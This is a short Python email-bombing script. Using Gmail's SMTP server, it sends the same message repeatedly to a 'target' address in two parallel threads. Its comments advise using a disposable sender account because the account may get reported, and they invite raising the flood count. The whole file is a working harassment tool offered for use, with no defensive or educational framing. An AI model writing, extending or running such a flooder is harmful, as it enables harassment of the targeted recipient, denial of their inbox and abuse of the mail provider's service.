import smtplib
import threading



def firstFunction():
    sender_email = (str("    "))   #Put Your email here (Preferably dump since it can get reported.
    rec_email = (str("    "))    #Put the Target email here.
    password = (str("    ")) #Put your email password here (This Script is not in anyway Logging any of this, The password is used to connect the module server to your account.
    message = (str("    ")) #Put any message you want
    floodnum = 100    #This is how many times This function is going to repeat, adjust it to any integer.
    current = 1

    #This is the code that Sends the mail

    while current != floodnum:
        current += 1
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, password)
        print("Login success1")
        server.sendmail(sender_email, rec_email, message)
        print("email has been sent to", rec_email)

        if current == floodnum:
             print("Email flood success")
             break


#second function to enable threading for faster sending. Repeat the Information you Wrote in the first function.

def secondFunction():
    sender_email = (str("    "))
    rec_email = (str("    "))
    password = (str("    "))
    message = (str("    "))
    floodnum = 100
    current = 1
    while current != floodnum:
        current += 1
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, password)
        print("Login success2")
        server.sendmail(sender_email, rec_email, message)
        print("email has been sent to", rec_email)

        if current == floodnum:
             print("Email flood success")
             break



        if current == floodnum:
             print("Email flood success")
             break

thread1 = threading.Thread(target=firstFunction)
thread1.start()
thread2 = threading.Thread(target=secondFunction)
thread2.start()



